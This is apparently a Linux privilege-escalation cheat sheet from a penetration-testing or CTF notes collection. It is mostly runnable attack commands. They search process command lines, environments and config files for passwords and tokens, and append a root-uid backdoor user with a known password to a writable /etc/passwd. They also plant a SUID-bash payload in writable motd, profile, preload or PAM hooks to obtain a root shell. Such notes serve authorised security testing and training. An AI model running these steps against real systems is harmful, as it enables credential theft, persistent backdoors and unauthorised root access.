# Less common Linux vectors

Run after [sudo](sudo.md), [SUID/caps](suid-and-capabilities.md), [root-run](root-run.md) and [groups](groups-and-nfs.md).

## Credentials in processes and environment
```bash
ps aux | grep -iE 'pass|pwd|secret|token|-u |mysql|sshpass'
for p in /proc/[0-9]*; do tr '\0' ' ' < $p/cmdline 2>/dev/null; echo; done | grep -iE 'pass|secret|token'
cat /proc/<PID>/environ 2>/dev/null | tr '\0' '\n'
```
- `cmdline` of other users' processes is readable unless `/proc` is mounted with `hidepid`; `environ` only for your own processes (or as root). A service reading a secret into its environment is common.
- `pspy64` also shows command lines of short-lived jobs ([enumeration](enumeration.md#processes-cron-timers-services)).

## Readable secrets
```bash
ls -la /etc/shadow /etc/shadow- /etc/gshadow /etc/sudoers /etc/sudoers.d/ 2>/dev/null
find / -xdev \( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.swp' -o -name '.env' -o -name '*.kdbx' \) -readable 2>/dev/null | head -50
grep -riE 'password\s*[=:]' /etc /opt /srv /var/www 2>/dev/null | head -50
```
- Writable `/etc/passwd`: add a root-uid user ([file-write](file-write.md#what-the-primitive-gives-you)):
```bash
openssl passwd -1 'Passw0rd!'
echo 'hax:<HASH>:0:0::/root:/bin/bash' >> /etc/passwd
su hax
```
- Database/service configs reused for system accounts: `su - <USER>` with each recovered password.

## Writable login and config hooks
```bash
find /etc/update-motd.d /etc/profile.d /etc/init.d /etc/ld.so.conf.d /etc/pam.d -writable -ls 2>/dev/null
ls -la /etc/ld.so.conf /etc/ld.so.preload 2>/dev/null
```
| Writable | Runs when |
| --- | --- |
| `/etc/update-motd.d/*` | As root when someone SSHes in (Debian/Ubuntu): add a payload, then log in |
| `/etc/profile.d/*.sh`, `/etc/bash.bashrc` | As each user at login |
| `/etc/ld.so.conf.d/*`, `ld.so.preload` | Library search order / injected libraries for every dynamic binary, including SUID |
| `/etc/init.d/*`, systemd unit | At boot / service restart → [root-run](root-run.md) |
| PAM config | At the next authentication; breaking it locks you out: copy first |

- Trigger yourself with a second SSH session; payload = `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash`, then `/tmp/rootbash -p`.
- Restore the original content afterwards.

## Package managers and schedulers
```bash
sudo -l                      # apt, pip, npm, yum with NOPASSWD → GTFOBins
ls -la /etc/cron.d /etc/anacrontab /etc/at.allow /etc/at.deny 2>/dev/null
atq 2>/dev/null
```
- `at` and `anacron` are less often checked than `cron`. `atq` lists queued jobs for the current user.
- Python hijack for root-run scripts: [sudo SETENV example](sudo.md#python-script-with-setenv-pythonpath); writable imported module the root script uses works the same way.

## doas
```bash
cat /etc/doas.conf 2>/dev/null
doas -L; doas -u root /bin/sh
```
- `permit nopass <USER> as root cmd <COMMAND>` → same GTFOBins logic as `sudo`.

## Containers and shared mounts
- Inside a container: [kernel and container checks](kernel-checks.md#capabilities--container); mounted host paths (`mount | grep -E 'host|/mnt'`, `findmnt`) and `docker.sock` are the way out.
- Mounted NFS/CIFS share with `no_root_squash` or a writable credentials file: [NFS](groups-and-nfs.md#nfs).
